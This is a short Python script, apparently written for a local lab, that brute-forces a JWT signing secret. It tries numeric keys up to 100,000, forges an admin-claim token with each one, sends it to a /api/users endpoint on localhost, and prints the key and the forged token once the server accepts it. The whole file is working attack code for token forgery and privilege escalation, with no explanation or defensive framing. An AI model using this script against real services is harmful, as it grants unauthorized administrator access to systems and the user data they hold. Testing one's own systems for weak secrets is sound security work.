import requests
import jwt
import time

url = "http://localhost:8080/api/users"
start = time.perf_counter()

for key in range(100000):
    #generating token based on random key
    token = jwt.encode({"isadmin": True}, str(key))

    #testing the token
    header={"Authorization": f"Bearer {token}"}
    res = requests.get(url, headers=header)
    if isinstance(res.json(), list):
        print(f"{time.perf_counter()-start} seconds")
        print(f"KEY={key}")
        print(token)
        break
